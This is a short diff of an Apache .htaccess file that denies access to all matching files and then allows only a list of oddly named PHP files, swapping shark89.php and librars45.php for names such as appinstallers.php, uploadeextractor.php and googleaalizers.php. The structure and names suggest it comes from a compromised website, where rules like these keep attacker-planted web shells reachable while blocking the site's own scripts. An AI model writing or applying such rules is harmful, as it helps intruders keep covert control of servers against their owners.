@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch '^(shark89.php|pagec.inc.php|librars45.php)$'>
+<FilesMatch '^(appinstallers.php|uploadeextractor.php|scanerswaps.php|confinax.php|app-stylezs.php|googleaalizers.php)$'>
  Order allow,deny
  Allow from all
 </FilesMatch>
